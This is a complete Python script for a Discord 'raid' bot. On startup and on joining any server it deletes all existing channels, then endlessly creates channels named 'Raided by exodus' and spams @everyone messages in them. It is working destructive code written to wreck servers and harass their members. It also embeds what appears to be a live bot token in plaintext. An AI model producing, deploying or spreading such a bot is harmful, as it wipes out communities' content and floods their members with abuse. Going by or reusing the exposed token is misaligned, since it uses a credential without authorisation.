import discord
from discord.ext import tasks
import asyncio

# Setup bot intents and permissions
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.messages = True
intents.message_content = True

bot = discord.Client(intents=intents)

# Bot token and configuration
TOKEN = 'MTI4NDQ0OTI5NTM2MTI0NTE5NQ.GLOkUc.OqtZnpGEnMUIsRwoyib2bJn7vF9kiXUPEJn96I'  # Replace with your bot token
CHANNEL_NAME = 'Raided by exodus'
REPEATING_MESSAGE = '@everyone god dammit he fell for it again!!!'

# Dictionary to store created channels per guild
created_channels = {}

# Function to delete channels except the ones the bot created
async def delete_non_bot_channels(guild):
    for channel in guild.channels:
        # Only delete channels that the bot did not create
        if guild.id not in created_channels or channel not in created_channels[guild.id]:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except Exception as e:
                print(f"Error deleting channel {channel.name}: {e}")

# Function to create new channels and track them
async def create_channel(guild):
    channel_name = f"{CHANNEL_NAME}-{len(created_channels.get(guild.id, [])) + 1}"
    new_channel = await guild.create_text_channel(channel_name)
    if guild.id not in created_channels:
        created_channels[guild.id] = []
    created_channels[guild.id].append(new_channel)
    print(f"Created channel: {new_channel.name}")

# Function to spam messages in the created channels
async def spam_messages(guild):
    while True:
        if guild.id in created_channels:
            for channel in created_channels[guild.id]:
                try:
                    await channel.send(REPEATING_MESSAGE)
                except Exception as e:
                    print(f"Error sending message to {channel.name}: {e}")
        await asyncio.sleep(5)  # Adjust interval as needed

# Function to continuously create channels
async def create_channels_continuously(guild):
    while True:
        await create_channel(guild)
        print(f"Created a new channel...")
        await asyncio.sleep(1)  # Adjust interval as needed

# When the bot is ready, process each guild it is in
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Process each guild the bot is currently in
    for guild in bot.guilds:
        print(f"Processing guild: {guild.name}")
        await delete_non_bot_channels(guild)  # Delete channels that the bot did not create
        bot.loop.create_task(create_channels_continuously(guild))  # Start creating channels continuously
        bot.loop.create_task(spam_messages(guild))  # Start spamming messages

# When the bot joins a new server
@bot.event
async def on_guild_join(guild):
    print(f"Joined new server: {guild.name}")
    await delete_non_bot_channels(guild)  # Delete channels that the bot did not create
    bot.loop.create_task(create_channels_continuously(guild))  # Start creating channels continuously
    bot.loop.create_task(spam_messages(guild))  # Start spamming messages

# Run the bot
bot.run(TOKEN)